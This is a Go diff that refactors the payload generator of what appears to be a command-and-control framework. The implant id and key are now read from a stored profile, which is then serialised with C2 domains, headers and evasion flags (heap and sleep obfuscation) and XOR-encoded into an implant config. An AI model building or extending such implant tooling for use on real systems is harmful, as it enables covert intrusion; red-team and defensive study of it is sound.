@@ -76,10 +76,10 @@ func buildHeaderString(headers []database.ProfileHeader) string {
 	return sb.String()
 }
 
-func CraftProfileBytes(prof database.Profile, id, key uint32) ([]byte, error) {
+func CraftProfileBytes(prof database.Profile) ([]byte, error) {
 	buf := new(bytes.Buffer)
 
-	writeU32(buf, id)
+	writeU32(buf, prof.Payload_id)
 
 	writeU32(buf, uint32(len(prof.Domains)))
 	for _, d := range prof.Domains {
@@ -101,7 +101,7 @@ func CraftProfileBytes(prof database.Profile, id, key uint32) ([]byte, error) {
 	writeU32(buf, boolToU32(prof.HeapObf))
 	writeU32(buf, boolToU32(prof.SleepObf))
 
-	writeU32(buf, key)
+	buf.Write(prof.Key)
 	profile := buf.Bytes()
 
 	var xorKey [4]byte
@@ -119,7 +119,8 @@ func CraftProfileBytes(prof database.Profile, id, key uint32) ([]byte, error) {
 }
 
 
-func GeneratePayload(profile database.Profile, id, key uint32, name, format string, debug bool) (string, error) {
+func GeneratePayload(profile database.Profile, name, format string, debug bool) (string, error) {
+
 	home, _ := os.UserHomeDir()
 	base := filepath.Join(home, ".kronos", "payload", "implant", "hades")
 	tmplPath := filepath.Join(base, "config.hpp.tmpl")
@@ -130,7 +131,7 @@ func GeneratePayload(profile database.Profile, id, key uint32, name, format stri
 		return "", err
 	}
 
-	profileData, err := CraftProfileBytes(profile, id, key)
+	profileData, err := CraftProfileBytes(profile)
 	if err != nil {
 		return "", err
 	}
